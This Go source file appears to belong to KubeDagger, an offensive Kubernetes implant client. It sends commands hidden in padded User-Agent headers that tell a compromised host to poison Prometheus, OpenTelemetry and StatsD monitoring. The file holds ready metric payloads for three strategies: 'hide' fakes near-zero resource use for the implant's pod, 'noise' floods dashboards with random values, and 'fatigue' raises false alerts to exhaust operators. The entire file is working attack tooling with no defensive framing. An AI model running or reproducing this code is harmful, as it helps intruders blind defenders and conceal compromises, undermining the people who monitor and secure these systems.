package obs_poison

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type PoisonResult struct {
	Target   string   `json:"target"`
	Endpoint string   `json:"endpoint"`
	Strategy string   `json:"strategy"`
	Metrics  []string `json:"metrics_injected"`
	Status   string   `json:"status"`
	Detail   string   `json:"detail"`
}

func Execute(serverTarget, poisonTarget, endpoint, strategy, output string) error {
	var result *PoisonResult

	switch poisonTarget {
	case "prometheus":
		result = poisonPrometheus(serverTarget, endpoint, strategy)
	case "otel":
		result = poisonOTel(serverTarget, endpoint, strategy)
	case "statsd":
		result = poisonStatsD(serverTarget, endpoint, strategy)
	default:
		return fmt.Errorf("unsupported poison target: %s (use prometheus, otel, or statsd)", poisonTarget)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func poisonPrometheus(serverTarget, endpoint, strategy string) *PoisonResult {
	if endpoint == "" {
		endpoint = "http://localhost:9091"
	}

	metrics := getPrometheusMetrics(strategy)
	cmd := fmt.Sprintf("obs_prometheus#%s#%s#%s", endpoint, strategy, strings.Join(metrics, ","))
	status := sendPoisonCommand(serverTarget, cmd)

	return &PoisonResult{
		Target:   "prometheus",
		Endpoint: endpoint,
		Strategy: strategy,
		Metrics:  metrics,
		Status:   status,
		Detail:   "push fake metrics to Prometheus Pushgateway or intercept /metrics scrape responses",
	}
}

func poisonOTel(serverTarget, endpoint, strategy string) *PoisonResult {
	if endpoint == "" {
		endpoint = "http://localhost:4318"
	}

	metrics := getOTelMetrics(strategy)
	cmd := fmt.Sprintf("obs_otel#%s#%s#%s", endpoint, strategy, strings.Join(metrics, ","))
	status := sendPoisonCommand(serverTarget, cmd)

	return &PoisonResult{
		Target:   "otel",
		Endpoint: endpoint,
		Strategy: strategy,
		Metrics:  metrics,
		Status:   status,
		Detail:   "inject fake spans and metrics to OTLP HTTP endpoint",
	}
}

func poisonStatsD(serverTarget, endpoint, strategy string) *PoisonResult {
	if endpoint == "" {
		endpoint = "localhost:8125"
	}

	metrics := getStatsDMetrics(strategy)
	cmd := fmt.Sprintf("obs_statsd#%s#%s#%s", endpoint, strategy, strings.Join(metrics, ","))
	status := sendPoisonCommand(serverTarget, cmd)

	return &PoisonResult{
		Target:   "statsd",
		Endpoint: endpoint,
		Strategy: strategy,
		Metrics:  metrics,
		Status:   status,
		Detail:   "send crafted UDP packets to StatsD/DogStatsD to inject false metrics",
	}
}

func getPrometheusMetrics(strategy string) []string {
	switch strategy {
	case "hide":
		return []string{
			"container_cpu_usage_seconds_total{pod=\"kubedagger\"}=0.001",
			"container_memory_working_set_bytes{pod=\"kubedagger\"}=1048576",
			"container_network_transmit_bytes_total{pod=\"kubedagger\"}=0",
		}
	case "noise":
		return []string{
			"node_cpu_seconds_total{mode=\"idle\"}=random",
			"node_memory_MemAvailable_bytes=random",
			"container_cpu_usage_seconds_total{pod=\"*\"}=random",
		}
	case "fatigue":
		return []string{
			"kube_pod_container_status_restarts_total{pod=\"kube-dns\"}=100",
			"node_filesystem_avail_bytes{mountpoint=\"/\"}=0",
			"kubelet_runtime_operations_errors_total=9999",
		}
	default:
		return []string{"container_cpu_usage_seconds_total=0"}
	}
}

func getOTelMetrics(strategy string) []string {
	switch strategy {
	case "hide":
		return []string{
			"trace:normal_operation{service=\"kubedagger\",duration_ms=5}",
			"metric:http_requests_total{service=\"kubedagger\",value=0}",
		}
	case "noise":
		return []string{
			"trace:random_span{service=\"*\",duration_ms=random}",
			"metric:random_counter{service=\"*\",value=random}",
		}
	case "fatigue":
		return []string{
			"trace:error_span{service=\"api-gateway\",status=ERROR}",
			"metric:error_rate{service=\"auth\",value=0.99}",
		}
	default:
		return []string{"trace:noop{duration_ms=1}"}
	}
}

func getStatsDMetrics(strategy string) []string {
	switch strategy {
	case "hide":
		return []string{
			"kubedagger.cpu:0.001|g",
			"kubedagger.memory:1048576|g",
			"kubedagger.network.tx:0|c",
		}
	case "noise":
		return []string{
			"system.cpu.idle:random|g",
			"system.memory.free:random|g",
			"app.requests:random|c",
		}
	case "fatigue":
		return []string{
			"app.errors:9999|c",
			"system.disk.free:0|g",
			"app.latency:30000|ms",
		}
	default:
		return []string{"app.health:1|g"}
	}
}

func sendPoisonCommand(target, command string) string {
	ua := buildPoisonUserAgent(command)

	req, err := http.NewRequest("GET", target+"/obs_poison", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "injected"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildPoisonUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}
